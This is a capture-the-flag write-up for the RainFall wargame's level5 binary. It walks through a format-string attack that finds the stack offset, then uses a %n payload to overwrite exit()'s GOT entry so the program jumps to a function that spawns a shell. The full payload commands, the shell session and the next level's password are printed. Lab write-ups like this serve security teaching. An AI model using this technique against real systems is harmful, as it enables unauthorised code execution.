Let's take a look at function o():
--------------------

0x080484aa <+6>: movl $0x80485f0,(%esp)
0x080484b1 <+13>: call system@plt

So o() does:

system(0x80485f0);
_exit(1);

That means it executes a shell command (probably /bin/sh).

So our goal is to redirect execution to: o() → 0x080484a4

BUT
---

We CANNOT overflow the return address because:

fgets limits to 0x200

buffer is 0x208

no direct overflow

BUT…
----

We control printf(buffer).

That means we can use: %n to write to memory.

The solution
------------


After printf, the program calls: call exit@plt

So if we overwrite the GOT entry of exit with the address of o()

Then when exit() is called… It will actually call: o()

The address of exit() in the GOT (Global Offset Table) and the address of the o() function.
-------------------------------------------------------------------------------------------

GOT = Global Offset Table : It is a table in memory that stores real addresses of external functions.

level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
level5@RainFall:~$ 

exit() => 08049838 => \x38\x98\x04\x08

and we already know o() 0x080484a4 => in decimal 134513828

THe Goal now is to  Overwrite: 0x08049838  →  0x080484a4

So when exit() is called → it jumps to o() → system("/bin/sh").

Let's check the stack offset 
----------------------------

level5@RainFall:~$ python -c 'print "aaaa" + " %x"*10' > /tmp/test
level5@RainFall:~$ cat /tmp/test | ./level5 
aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078

The offset is located at the 4th position

level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/pass
level5@RainFall:~$ cat /tmp/pass - | ./level5 


whoami
level6
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31

